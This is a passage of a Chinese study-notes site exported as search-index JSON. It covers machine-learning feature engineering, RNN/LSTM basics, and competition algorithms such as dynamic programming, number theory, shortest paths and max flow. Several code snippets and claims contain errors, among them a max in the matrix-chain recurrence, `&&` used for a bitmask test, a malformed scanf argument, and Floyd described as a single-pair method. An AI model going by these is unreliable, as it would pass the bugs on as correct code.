这样的字符串转换为独热矢量。）\ncity_id: \u0026quot;br/sao_paulo\u0026quot;\r但收集由其他模型推理的值会产生额外成本。可能值“219”目前代表圣保罗，但这种表示在未来运行其他模型时可能轻易发生变化：\ninferred_city_cluster: \u0026quot;219\u0026quot;\r清理数据 #  1. 缩放特征值 #  缩放是指将浮点特征值从自然范围（例如 100 到 900）转换为标准范围（例如 0 到 1 或 -1 到 +1）。如果某个特征集只包含一个特征，则缩放可以提供的实际好处微乎其微或根本没有。不过，如果特征集包含多个特征，则缩放特征可以带来以下优势：\n 帮助梯度下降法更快速地收敛。 帮助避免“NaN 陷阱”。在这种陷阱中，模型中的一个数值变成 NaN（例如，当某个值在训练期间超出浮点精确率限制时），并且模型中的所有其他数值最终也会因数学运算而变成 NaN。 帮助模型为每个特征确定合适的权重。如果没有进行特征缩放，则模型会对范围较大的特征投入过多精力。  您不需要对每个浮点特征进行完全相同的缩放。即使特征 A 的范围是 -1 到 +1，同时特征 B 的范围是 -3 到 +3，也不会产生什么恶劣的影响。不过，如果特征 B 的范围是 5000 到 100000，您的模型会出现糟糕的响应。\n2. 处理极端的离群值 #  如何最大限度降低这些极端离群值的影响？\n  一种方法是对每个值取对数。\n对数缩放可稍稍缓解这种影响，但仍然存在离群值这个大尾巴。\n  只是简单地将的最大值“限制”为某个任意值（比如 4.0），所有大于 4.0 的值都将变成 4.0。\n  3. 分箱 #  为了将纬度变为一项实用的预测指标，我们对纬度“分箱”，如下图所示：\n我们现在拥有 11 个不同的布尔值特征（LatitudeBin1、LatitudeBin2、…、LatitudeBin11），而不是一个浮点特征。拥有 11 个不同的特征有点不方便，因此我们将它们统一成一个 11 元素矢量。这样做之后，我们可以将纬度 37.4 表示为：\n[0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0]\r4. 清查 #  截至目前，我们假定用于训练和测试的所有数据都是值得信赖的。在现实生活中，数据集中的很多样本是不可靠的，原因有以下一种或多种：\n 遗漏值。 例如，有人忘记为某个房屋的年龄输入值。 重复样本。 例如，服务器错误地将同一条记录上传了两次。 不良标签。 例如，有人错误地将一颗橡树的图片标记为枫树。 不良特征值。 例如，有人输入了多余的位数，或者温度计被遗落在太阳底下。  关键词 #  关键字词：\n分箱、特征集 、NaN 陷阱、离群值、缩放\n"},{"id":245,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/9.featurecrosses/","title":"9. Feature Crosses","section":"机器学习快速入门教程","content":"特征组合 #  对非线性规律进行组合 #  特征组合是指通过将两个或多个输入特征相乘来对特征空间中的非线性规律进行编码的合成特征。“cross”（组合）这一术语来自 cross product（向量积）。\n我们通过将 $$x_1$$ 与 $$x_2$$ 组合来创建一个名为 $$x_3$$ 的特征组合：$$x_3 = x_1 x_2$$\n我们像处理其他特征一样来处理这个新建的 $$x_3$$ 特征组合。线性公式变为：$$y = b + w_1x_1 + w_2x_2 + w_3x_3$$\n线性算法可以算出 $$w_3$$ 的权重，就像算出 $$w_1$$ 和 $$w_2$$ 的权重一样。换言之，虽然 $$w_3$$ 表示非线性信息，但您不需要改变线性模型的训练方式来确定 $$w_3$$ 的值。\n我们可以创建很多不同种类的特征组合。例如：\n [A X B]：将两个特征的值相乘形成的特征组合； [A X B X C X D X E]：将五个特征值相乘形成的特征组合； [A X A]：对单个特征的值求平方形成的特征组合。  关键字词：特征组合、合成特征\n组合独热矢量 #  笛卡儿积\n"},{"id":246,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/rnn/","title":"Rnn","section":"机器学习快速入门教程","content":" 学习地址：\n https://www.youtube.com/watch?v=lWkFhVq9-nc   introduction to RNN #  Feed Forward Neural Network, FFNN #  In a Feed-Forward Network, information flow only in forward direction.\ngraph LR;\rI{input}; IL(Input Layer); HL(Hidden Layer); OL(Output Layer); O{Predicted output}\rI--\u0026gt;IL; IL--\u0026gt;HL; HL--\u0026gt;OL; OL--\u0026gt;O;\r Decisions are based on current input. No memory about the past. No future scope.  Question:\n cannot handle sequential data. considers only the current input. cannot memorize previous inputs.  Recurrent Neural Network, RNN #  graph LR;\rI{input}; IL(Input Layer); HL(Hidden Layer); OL(Output Layer); O{Predicted output}\rI--\u0026gt;IL; IL--\u0026gt;HL; HL--\u0026gt;OL; OL--\u0026gt;O; HL--\u0026gt;HL;\rHow does RNN works?\nTypes of RNN：\n  many to one network\n  many to many network\n  Gradient Problem: #   Vanishing Gradient Problem. Explaining Gradient Problem.  Solution to Gradient Problem:\nLong Short-Term Memory Network, LSTM #  LSTMs are special kind of RNN, capable of learning long-term dependencies.\nThree steps of LSTMs:\nStep-1: Decides how much of the past it should remember #  It looks at the previous state ($$h_{t-1}$$) and the current input $$x_t$$ and computes the function.\n $$f_t = \\sigma(W_f [h_{t-1}, x_t] + b_f)$$, $$f_t$$ is called forget gate.  Step-2: Decides how much should this unit add to the current state #  There are 2 parts:\n  One is sigmoid function, it decides which values to let through (0 or 1).\n$$i_t = \\sigma(W_i [h_{t-1}, x_t] + b_i)$$\n  The other is tanh function, which gives the weightage to the value which are passed deciding their level of importance (-1 to 1).\n$$\\overset{\\sim}{C_t} = tanh(W_C [h_{t-1}, x_t] + b_c)$$\n  Step-3: Decides what part of the current cell state makes it to the output #  $$o_t = \\sigma(W_o [h_{t-1}, x_t] + b_0)$$, $$o_t$$ is called output gate.\n$$h_t = o_t * tanh(C_t)$$\nImplementation of LSTM #  "},{"id":247,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/1.%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE/","title":"1.基础题目","section":"算法竞赛入门经典","content":"基础题目 #  数学相关 #   Cantor 数表：将 Georg Cantor 用于证明有理数是可穷举的数表，拟合为一个列表（第一项是 1/1，第二项是 1/2，接着是 2/1、3/1、2/2、1/3\u0026hellip;）。\n求 Cantor 数表的第 n 项。\n 第 i 条线上有 i 个数。\n 果园里的树：树排列成矩阵，它们的 x/y 坐标均是 1-99 的整数。输入若干个三角形，依次统计每个三角形内部和边界上总共有多少棵树。\n 三角形的有向面积：$$\\begin{pmatrix} x_0 \u0026amp; y_0 \u0026amp; 1 \\ x_1 \u0026amp; y_1 \u0026amp; 1 \\ x_2 \u0026amp; y_2 \u0026amp; 1 \\end{pmatrix}$$\n 多少块土地：你有一块椭圆形的地，在边界上选取 n 个点，两两连接得到 $$\\displaystyle \\frac{n(n-1)}{2}$$ 条线段，它们最多能把土地分成多少个部分。\n 欧拉公式：V - E + F = 2；\n图相关 #   岛屿问题\n DFS (Depth-First Search, DFS): 深度优先遍历。\n 迷宫问题\n BFS (Breadth-First Search): 广度优先遍历。\n可以构造一个以起点为根节点的树状结构。\n 拓扑排序 (topological sort)：对于 n 个变量，m 个二元组 (u, v) 表示 u \u0026lt; v：把每个变量看成一个点，每个二元组看成一条有向边，把一个图的所有节点进行排序，使得有向边的 u 都在 v 的前面，这个过程称为拓扑排序。\n 有向无环图 (Directed Acyclic Graph, DAG)\n 欧拉回路\n 暴力法 #  回溯法 #   八皇后问题\n 回溯法 (backtracking)。\n 素数环：输入正整数 n，把 1-n 组成一个环，使得任意相邻两个数字的和为素数。\n 隐式图搜索 #   埃及分数：在古埃及，人们使用单位分数的和表示一切有理数。例如：2/3 = 1/2 + 1/6，但是不允许相同的加数出现，比如：2/3 = 1/3 + 1/3。对于一个分数 a/b，表示方法有很多种，其中加数越少越好，如果加数个数相同则最大的分母越小越好。\n给定两个整数 a、b，求最佳表达式。\n 迭代加深搜索 (iterative deepening)：从小到大枚举深度上限 d，每次只考虑深度不超过 d 的节点。\n深度上限对于这个题目还可以用剪枝 (prune) 的思想，如果扩展到 i 层，前 i 的分数和为 c/d，而第 i 个分数为 1/e，那么接下来还需要 (a/b-c/d)/(1/e) 的分数。\n 倒水问题\n 假设每个水杯中盛放了一定量的水，认为是一种状态，那么我们可以构造出一个状态转移有向图。\n 八数码问题：编号为 1-8 的 8 个正方形被摆成 3 行 3 列。每次操作可以把与空格相邻的任意滑块移动到空格中，使得该滑块原来的位置成为新的空格。\n如果给定初始局面和目标局面，计算出最少的移动步数。\n 每个状态认为是图的一个节点，上述问题就是图上的最短路问题。\n高效算法 #   最大连续和。\n $O(n^3)$ 算法：三层循环；\n$O(n^2)$ 算法：设 $S_i$ 为前 i 项和，求解 $S_j - S_i$ 的最大值只需要两层循环；\n$O(n log n)$ 算法：分治策略，前一半的最大、后一半的最大，起点在前面终点在后面的最大；\n$O(n)$ 算法：迭代式计算以 n 结尾的最大连续和。\n 循环日程表问题\n 递归。\n贪心算法 #   最优装载问题：给定 n 个物品的重量，选择尽量多的物体使得总重量不超过 C。\n 优先装载较轻的物品。\n 部分背包问题：给定 n 个物品的重量和价值，在总重量不超过 C 的情况下使得总价最高。每个物品可以只取走一部分，价值按比例计算。\n 优先取 “价值/重量” 最大的。\n 乘船问题：给定 n 个人的重量，每艘船承重 C，且最多只能乘两个人。用最少的船装载所有人。\n 从最轻的人开始，选择能跟他一起乘坐的人中，最重的人一起乘船。\n 选择不相交区间：给定 n 个开区间，选择尽量多的区间使得两两之间没有公共点。\n 按上限排序，从小到大选择。\n 区间选点问题：给定 n 个闭区间，取尽量少的点使得每个区间中至少有一个点。\n 按上限排序，直接选择区间的上限。\n 区间覆盖问题：给定 n 给闭区间，选择尽量少的闭区间完全覆盖给定线段；\n "},{"id":248,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/2.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%88%9D%E6%AD%A5/","title":"2.动态规划初步","section":"算法竞赛入门经典","content":"动态规划初步 #  问题：数字三角形 #   有一个由非负整数组成的三角形，第一行只有一个数字，出了最下面一行之外的每一个数字的左下方和右下方都有一个数字。\n如果从第一行开始，每次可以向左下或右下走一格，怎样的走法能使路径节点和最大。\n 如果我们把每个格子按照行列编号，然后定义 d(i, j) 为从格子 (i, j) 出发时能得到的最大和，于是原问题即求解 d(1, 1)，可以得到状态转移方程：\n $d(i, j) = a(i, j) + max(d(i+1, j), d(i+1, j+1))$  最优子结构（optimal substructure）：全局最优解包含局部最优解，如果局部不是最优的，那么全局肯定不是最优的。\n除了动态规划之外，这个问题还可以使用记忆化 (memoization) 的思想。\nDAG 上的动态规划 #  最长路径问题 #   嵌套矩形：有 n 个长宽分别为 $(a_i, b_i)$ 的矩形，如果对于两个矩形 X(a, b), Y(c, d)，如果 a\u0026lt;c, b\u0026lt;d 或者 a\u0026lt;d, b\u0026lt;c，那么我们称 X 可以被 Y 嵌套。\n给定任意多的矩形，求最长的嵌套序列，使得序列中的每个矩形都能嵌套在后一个中。\n 这个问题中的“嵌套”就是一个典型的二元关系，可以 DAG 来建模。\n在这样一个嵌套关系的 DAG 中，如果设 d(i) 表示从节点 i 出发的最长路长度，边的集合设为 E，那么可以得到有状态转移方程：\n $d(i) = max{d(j) + 1 | (i, j) \\in E}$  假设 E 存储在邻接矩阵 G 中，如果我们得到了 G，那么可以用记忆化搜索解决 d 的值：\nint dp(int i) { int\u0026amp; ans = d[i]; if (ans \u0026gt; 0) return ans; for (int j = i; j \u0026lt;= n; j++) if (G[i][j]) ans \u0026gt;?= dp(j) + 1; return ans; } 固定终点的最长最短路径 #   硬币问题：有 n 中硬币，面值分别为 $V_1, V_2, \\cdots, V_n$，每种都有无限多。给定非负整数 S，可以选用多少个硬币使得面值只和为 S。\n输出满足条件的策略中，硬币数量的最大值和最小值。\n 这个问题同样可以用 DAG 来建模，把每点看作“还需要凑足的面值”，对于还需要凑足 i 的面值设为 $r(i)$，则初始状态为 $r(S)$，目标状态为 $r(0)$。\n注意到最大与最小是类似的，我们以最大值为例，伪代码如下：\nint dp(int S) { int\u0026amp; ans = d[S]; if (ans != -1) return ans; ans = -1 \u0026lt;\u0026lt; 30; for (int i = 1; i \u0026lt;= n; i++) if (S \u0026gt;= V[i]) ans \u0026gt;?= dp(S-V[i])+1; return ans; }  注意，用 ans != -1 而不是 ans \u0026gt;= 0，可以区分“无法到达”与“还没算过”这两种情况；  对于需要同时计算最大值的最小值的情况，使用递推而不是迭代更合适：\nmin[0] = max[0] = 0; for (int i = 1; i \u0026lt;= S; i++) { min[i] = INF; max[i] = -INF; } for (int i = 0; i \u0026lt;= S; i++) for (int j = 1; j \u0026lt;= n; j++) if (i \u0026gt;= V[j]) { min[i] \u0026lt;?= min[i - V[j]] + 1; max[i] \u0026gt;?= max[i - V[j]] + 1; } printf(\u0026#34;%d %d\\n\u0026#34;, min[S], max[S]); 调试方式 #  对于上面的两个题目，可以用下面的方法打印字典序路径：\nvoid print_ans(int i) { printf(\u0026#34;%d \u0026#34;, i); for (int j = 1; j \u0026lt;= n; j++) if (G[i][j] \u0026amp;\u0026amp; d[i] == d[j]+1) { print_ans(j); break; } } 因为 d 的含义是“以 i 为起点的最长路径”，所以上面的方法打印字典序是可行的。另一打印字典序的方式就是在计算的过程中把路径记录下来。\n区分“无法到达”与“还没算过”可以单独建立一个 vis 数组。\n0-1 背包问题 #  DAG 的状态 #   物品无限背包问题：有 n 中物品，每种均有无穷多个。第 i 种物品的体积为 $V_i$，重量为 $W_i$。选一些物品装到一个容器为 C 的背包中，使得在背包内物品的总体积不超过 C 的前提下，重量尽量的大。\n 跟硬币问题类似，这个问题可以用一个带权的 DAG 建模。\n 0-1 背包问题：有 n 种物品，每种只有一个。第 i 种物品的体积为 $V_i$，重量为 $W_i$。选一些物品装到一个容量为 C 的背包中，使得背包在物品的总体积不超过 C 的前提下尽量最大。\n 我们发现套用上面的模型已经不适用了。我们可以参考回溯法中，“阶段”的概念，把 n 种物品的选与不选的两种状态理解为一颗决策树的两个扩展过程。\n于是如果我们可以用 d(i, j) 表示当前在第 i 层（即已经做了 i 次决策），剩余容量为 j 时接下来的重量和，那么可以得到状态转移方程：\n $d(i, j) = max{d(i+1, j), d(i+1, j - V_i) + W_i}$ PS：上述公式即，每次决策的状态由下一次决策是否决定两种状态的最大值确定。  规划方向 #  对于 0-1 背包问题，我们容易得出一个对称的解法：\n $f(i, j) = max{f(i-1, j), f(i - 1, j -V_i) + W_i}$ PS：跟上面的状态转移方程是完全对称的，决策树扩展方向恰好相反。  这个扩展方向的好处是：我们不需要多余的内存把 V 和 W 保存下来：\nfor (int i = 0; i \u0026lt;= n; i++) { scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;V, \u0026amp;W); for (int j = 0; j \u0026lt;= C; j++) { f[i][j] = (i == 1 ? 0 : f[i-1][j]); if (j \u0026gt;= V) f[i][j] \u0026gt;?= f[i-1][j-V] + W; } } 滚动数组 #  为了降低空间复杂度，我们甚至可以把 f 降成一维的：\nmemset(f, 0, sizeof(f)); for (int i = 0; i \u0026lt;= n; i++) { scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;V, \u0026amp;W); for (int j = C; j \u0026gt;= 0; j--) if (j \u0026gt;= V) f[j] \u0026gt;?= f[j-V] + W; } 递归结构中的动态规划 #   最优矩阵链乘：给出 n 个矩阵组成的序列，第 i 个矩阵 $A_i$ 的是 $p_{i-1} \\times p_i$ 的，设计一种方法把它们依次乘起来，使得运算量最小。\n 因为矩阵的乘法满足结合律而不满足交换律。不同优先级的乘法计算方式，则会有不同的计算量。\n我们考虑一个子问题 $f(i, j) \\Rightarrow \\text{运算次数}(\\prod_{k = i}^{j} A_k)$ ，状态转移方程：\n  $f(i, j) = max{f(i, k) + f(k, j) + p_{i-1}p_kp_j}$\n  运算的边界为 $f(i, i) = 0$\n  这个问题的特殊性在于：不同于 DAG 上的动态规划，这里的动态规划在计算时无论是按照 i 还是 j 的递增或递减的顺序均不正确。更合理的方法是按照 j-i 递增的方式递推。\n 最优三角形划分：对于一个 n 个顶点的凸多边形，有很多种方法可以对他进行三角刨分，即用 n-3 条互不相交的对角线把凸多边形分成 n-2 个三角形。\n为每个三角形规定一个权函数 w(i, j, k)，求让所有三角形权和最大的分割方案。\n 相对于“最优矩阵链乘积”，这个问题的特殊性在于：我们没有一个清晰的决策过程。\n我们可以定义一个状态 $f(i, j)$ 表示从顶点 i 到顶点 j 所构成的子多边形的最大三角形刨分劝和，即可得到一个清晰的决策过程。\n这样我们就把决策起点设置为任意的 f(1, 1)，可以证明从任何一个顶点作为起点开始，不影响决策结果。可以得到状态转移方程：\n $f(i, j) = max{f(i, k) + f(k, j) + w(i,j,k)}$   树的最大独立集：对于一颗 n 个节点的无根树（即无环无向图），选出尽量多的节点，使得任意两个节点均不相邻，则我们称这些节点构成的集合称为“最大独立集”。\n给定 n-1 条无向边，输出一个最大独立集。\n 同样的我们需要一个清晰的决策过程，我们把任何一个节点设置为根节点，即可自顶向下进行递归。\n对于每个节点 i 只有两种决策：选或不选。这两种分别对于不同的决策结果，可以得到状态转移方程：\n $\\displaystyle d(i) = max{1 + \\sum_{j \\in grand_son(i)} d(j), \\sum_{j \\in son(i)} d(j)}$  集合上的动态规划 #   最优配对问题：空间中有 n 个点 $P_0, \\cdots, P_{n-1}$，n 为偶数。可以有多种方式将这 n 个点配对成 n/2 个数对，求一种配对方式是的所有点对中两点距离之和最小的那种配对方式。\n 多阶段决策：\n 先确定 $P_0$ 要和谁配对，以此类推最后确定 $P_{n-1}$ 要和谁配对。  状态：\n $d(i, S) \\Rightarrow$ 前 i 个点组成的集合 S，元素两两匹配的最小值； 注意到 i 实际上就是 S 这个集合中的最大值，所以我们可以用 d(S) 来更简洁地表示这个状态  状态转移方程：\n $d(i, S) = min{|P_iP_j| + d(i - 1, S - {i} - {j}) | j \\in S}$ 优化：$d(S) = min{|P_iP_j| + d(S - {i} - {j})| j \\in S, i = max{S}}$  针对于这个题目，我们还需要一个表示集合的方法，可以用下表标{0, 1, 2, ..., n-1} 唯一表示一个元素，然后有二进制编码表示一个子集。\n代码实现：\nfor (int S = 0; S \u0026lt; (1\u0026lt;\u0026lt;n); S++) { int i, j; d[S] = INF; for (int i = 0; i \u0026lt; n; i++) if (S \u0026amp;\u0026amp; (1 \u0026lt;\u0026lt; i)) break; for (j = i+1; j\u0026lt;n; j++) if (S \u0026amp; (1\u0026lt;\u0026lt;j)) d[S] \u0026lt;?= dist(i, j) + d[S^(1 \u0026lt;\u0026lt; i)^(1\u0026lt;\u0026lt;j)]; } 总结 #  我理解动态规划的本质是对回溯的“空间换时间”优化，当一个问题的决策路径过长，但是决策空间在一定范围内时，我们可以通过计算这个决策空间中的所有情况，来迭代式地计算出原问题的解。\n动态规划一般可以拆分成以下的几步：\n 决策：找出一个多阶段决策方式； 状态：确定一种能够唯一描述一个决策中间状态的方法。状态表示有以下的两个核心考虑点：  状态的参数、维度：可以用穷举的变量参数做参数，二维的时间复杂度 $$O(n^2)$$。也可以用一个集合的子集做参数，单个集合的时间复杂度是 $$O(2^n)$$； 状态的对应的值：值是为状态转移方程服务的，可以是一个数字、结构、bool 值等；   转移：列举出状态转移方程。  优化方式：\n 动态规划通常存在两种规划方向，有的方向可以节省空间； 滑动数组一般可以把空间复杂度从 $$O(n^2)$$ 降低到 $$O(n)$$  "},{"id":249,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/3.%E6%95%B0%E5%AD%A6%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%96%B9%E6%B3%95/","title":"3.数学概念与方法","section":"算法竞赛入门经典","content":"数学概念与方法 #  数论初步 #  最大公因数算法 #  辗转相除法，或欧几里得算法（Euclid Algorithm）：\nint gcd(int a, int b) { return (b == 0) ? a : gcd(b, a%b); } 值得一提的是，通过 gcd 可以计算出 lcm：\nint lcm(int a, int b) { return a / gcd(a, b) * b; } 有一个细节是先除后乘可以避免整数溢出；\n素数定理 #  Eratosthenes 筛法：\nint m = sqrt(n + 0.5); int c = 0; memset(vis, 0, sizeof(vis)); for (int i = 2; i \u0026lt;= m; i++) if (!vis[i]) { prime[c++] = i; for (int j = i*i; j \u0026lt;= n; j += i) vis[j] = 1; } 素数定义：\n $$\\displaystyle \\pi(x) \\sim \\frac{x}{ln(x)}$$，其中 $$\\pi(x)$$ 表示不超过 x 的素数数量；  欧几里得扩展算法 #  欧几里得扩展算法找出以下问题解的一种算法：\n 对于任意的整数 a,b，找出方程的 $$ax + by = gcd(a, b)$$ 的整数解 (x, y)。  找出一组解：\nvoid gcd(int a, int b, int\u0026amp; d, int\u0026amp; x, int\u0026amp; y) { if (!b) { d = a; x = 1; y = 0; } else { gcd(b, a%b, d, y, x); y -= x*(a/b); } } 通过一组解可以推导出其他的解。\n这个算法的一个核心应用就是求逆元，比如 a 关于 b 的逆元 $$a * a^{-1} \\equiv 1 \\pmod{b}$$，可以先构造方程 $$ax + by = 1$$，方程的解 x 即为 a 关于 b 的逆元。\n排列与组合 #  二项式定理 #  二项式定理的系数和杨辉三角一样：\n $$\\displaystyle (a + b)^n = \\sum_{k = 0}^{n} C_n^ka^{n - k}b^k$$  组合数 $$C_n^k$$ 的计算，可以利用数学递推公式 $$\\displaystyle C_n^k = \\frac{n - k + 1}{k} C_n^{k-1}$$：\nmemset(C, 0, sizeof(C)) C[0] = 1; for (int i = 1; i \u0026lt;= n; i++) C[i] = C[i - 1] * (n - i + 1) / i; 欧拉函数 #  考虑这个问题：\n 给出正整数 n 的唯一分解式 $$n = p_1^{a_1} \\cdots p_k^{a_k}$$，求小于 n 且与 n 互素的数字的个数。  上面这个问题的解即称为欧拉函数：\n $$\\displaystyle \\varphi(n) = \\sum_{S \\subseteq {p_1, p_2,\\cdots, p_k}} (-1)^{|S|} \\frac{n}{\\prod_{p_i \\in S} p_i} = n (1 - \\frac{1}{p_1})\\cdots(1 - \\frac{1}{p_k})$$  在 sage 中，欧拉函数可以直接用 euler_phi 函数计算：\nfrom sage.all import * print(euler_phi(24), euler_phi(64), euler_phi(187), euler_phi(360)) # (8, 32, 160, 96) 递推 #  汉诺塔、Fibonacci 数列、Catalan 数。\n"},{"id":250,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/4.%E5%9B%BE%E8%AE%BA%E6%A8%A1%E5%9E%8B%E4%B8%8E%E7%AE%97%E6%B3%95/","title":"4.图论模型与算法","section":"算法竞赛入门经典","content":"图论模型与算法 #  图的表示方法 #  本书中的图通过空间复杂度 $O(|V| + 3 * |E|)$ 表示（无向图的边需要通过两条有向边表示）：\n first：长度为 $|V|$ 的数组，每个元素 x 表示从 x 出发的第一条边； u、v：长度为 $|E|$ 的数组，分别存储着边关联的两个节点； next：长度为 $|E|$ 的数组，边的邻接链表的下一条边；  树 #  无根树转化为有根树 #  转化代码：\nvoid dfs(int u, int fa) { int d = G[u].size(); for (int i = 0; i \u0026lt; d; i++) { int v = G[u][i]; if (v != fa) dfs(v, p[v] = u); } } 表达式树 #  二叉树是表达式处理的常用工具，其中每个非叶子节点都表示一个运算符，它的左子树是这个运算符的第一个运算数，右子树则是这个运算符的第二个运算数。\n如何通过一个字符串建立表达式树呢，方法有很多种（详见《编译原理》）。\n最小生成树 #  在无向图中，连通且不含圈的图称为树。\n如果给定无向图 G=(V,E)，如果存在一个 E 的子集连接了 V 中的所有点，那我们称这个子集为 G 的生成树，而权值最小的生成树则被称为最小生成树（Minimal Spanning Tree, MST）。\n求一个 MST 的方法有很多种，最常见的有两种：Kruskal 算法和 Prim 算法，https://zhihu.com/question/27566032/answer/287968877\n并查集 #  在上面的最小生成树问题中，有一个常见的图论问题要处理：\n 如何判断图中的两个点是否属于同一个“连通分量”（即一个连通图的所有点的集合）； 通过添加一个边的方法将两个“连通分量”合并。  上面这两个诉求有这样的特点：\n 我们只关心连通这一个信息，不关心具体的连通方式，类似于一个集合；  这个问题可以用一个树状结构“并查集”表示，并查集由多个集合构成，每个集合通过一颗树状的结构表示，两个节点如果属于同一个“连通分量”，那么它们一定属于同一棵树，这棵树的根节点被称为这个集合的“代表元”（representative）。\n实现一个并查集核心在与 find 方法 ，即如何找到一个给定节点所在的树的代表元：\nint find(int x) { return p[x] == x ? x : p[x] = find(p[x]); } 最短路问题 #  Dijkstra 算法 #  之前动态规划的章节中有提到 DAG 中的动态规划可以用于解决最短路问题。但是如果图中有环，那么之前的方法就不适用了。\nDijkstra 算法可以用于计算正权图上的单源最短路问题（SSSP, Single-Source Shortest Paths）。用 w[i][j] 表示两个边之间的权值（INF 表示不连接），d[i] 表示源节点到节点 i 的距离，那么 Dijkstra 算法是实现如下：\nmemset(v, 0, sizeof(v)); for (int i = 0; i \u0026lt; n; i++) d[i] = i == 0 ? 0 : INF; for (int i = 0; i \u0026lt; n; i++) { int x, m = INF; for (int y = 0; y \u0026lt; n; y++) if (!v[y] \u0026amp;\u0026amp; d[y] \u0026lt;= m) m = d[x=y]; v[x] = 1; for (int y = 0; y \u0026lt; n; y++) d[y] \u0026lt;?= d[x] + w[x][y]; } 简单地来说，Dijkstra 算法分为以下两步：\n 在所以未访问的节点中，找出距离源节点最近的节点 x； 给 x 做标记，并且更新所有与 x 响铃的点到源节点的距离；  我们通常把这个算法的第二步称为松弛操作（relexation）。\n优化 Dijkstra 算法 #  邻接表（Adjacency List）：一种稀疏图（Sparse Graph）的表示方式。在这种表示法中，每个结点 i 都有维护一个链表，里面保存着从 i 出发的所有边。\n以下是一个从读入开始的例子：\nint n, m; int first[MAXN]; int u[MAXM], v[MAXM], w[MAXM], next[MAXM]; void read_graph() { scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m); for (int i = 0; i \u0026lt; n; i++) first[i] = -1; for (int e = 0; e \u0026lt; m; e++) { scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;u[e], \u0026amp;v[e], \u0026amp;[e]); next[e] = first[u[e]]; first[u[e]] = e; } } 其中：\n u/v/w 都是原始输入，分别为编号为 e 的边连接的两个节点，以及这个边的权值； first 表示编号为 i 的节点的第一个边，用 next 连接所有的边；  使用邻接表可以优化 Dijkstra 算法的第二步，从 O(n) 优化到 O(m)。对于算法的第一步，即“找出未标号节点中的最小 d 值”，可以使用优先级队列进行优化。\n使用优先级队列的代码实现如下：\nstruct cmp { bool operator() (const int a, const int b) { return a % 10 \u0026gt; b % 10; } } priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, cmp\u0026gt; q; 使用优先级队列可以把第一步的复杂度从 O(n) 降低到 O(logn)。\nBellman-Ford 算法 #  与 Dijkstra 算法类似，Bellman-Ford 算法主要分为以下两步：\n 遍历所有节点，对每个结点执行松弛操作； 更新当前遍历节点的所有相邻节点，对他们也执行松弛操作。  这个算法的朴素实现是 O(mn)，具体在实现时可以使用 FIFO 进行优化：\nqueue\u0026lt;int\u0026gt; q; bool inq[MAXN]; for (int i = 0; i \u0026lt; n; i++) d[i] = i == 0 ? 0 : INF; memset(inq, 0, sizeof(inq)); q.push(0); while(!q.empty()) { int x = q.front(); q.pop(); inq[x] = false; for (int e = first[x]; e != -1; e = next[e]) if (d[v[e]] \u0026gt; d[x] + w[e]) { d[v[e]] = d[x] + w[e]; if (!inq[v[e]]) { inq[v[e]] = true; q.push(v[e]); } } } Floyd 算法 #  如果你仅仅需要计算两个点之间的最短路，不必调用 n 次 Dijkstra（边权均为正）或者 Belman-Ford（有负权）。只需要使用下面的 Floyd-Warshall 算法：\nfor (int k = 0; k \u0026lt; n; k++) for (int i = 0; i \u0026lt; n; i++) for (int j = 0; j \u0026lt; n; j++) d[i][j] \u0026lt;?= d[i][k] + d[k][j] 网络流初步 #  增广路定理 #   对于一个网络拓扑图 G=(V, E)，对于每条边 $$(u, v) \\in E$$，有一个运送物品的上限称为容量 c(u,v)，它在一个特定的问题下实际运送的物品数量称为流量 f(u, v)。\n最大流问题：求一个方案，把最多的物品从 s 运送到 t（其中 $$s, t \\in V$$）\n 问题中通过 f、c 建模描述的最大流问题满足这样的一些性质：\n 容量限制：$$f(u, v) \\le c(u, v)$$ 斜对称性：$$f(u, v) = -f(v, u)$$ 流量平衡：对于除了 s、t 之外的任意节点 u，$$\\displaystyle \\sum_{(u, v) \\in E} f(u, v) = 0$$  残量网络（residual network）：\n 对于 E 中的每一条边 (u,v) 都有 f、c 两个属性值，对图中的每一条边进行计算，将 (u, v) 这样一个有向边分解成两个有向边：u 到 v 且权值为 f；v 到 u 且权值为 c-f； 通过这样的方式构造出来的一张新图称为残量网络  增广（augmenting）：\n 在残量网络中找出任意一条从 s 到 t 的有向路径，找出道路中所有残量的最小值 d，把对应所有边上的流量增加 d。 上面描述的这个过程称为增广。  增广路定理：\n 当且仅当残量网络中不存在 s-t 有向路径时，此时状态对应的流是 s 到 t 的最大流。  根据增广路定理我们可以使用 BFS 遍历所有路径，这被称为 Edonds-Karp 算法：\nqueue\u0026lt;int\u0026gt; q; memset(flow, 0, sizeof(flow)); f = 0; while (true) {\t// 循环出口是，找不到从 s 到 t 的路径  memset(a, 0, sizeof(a)); a[s] = INF; q.push(s); while (!q.empty()) { int u = q.front(); q.pop(); for (int v = 1; v 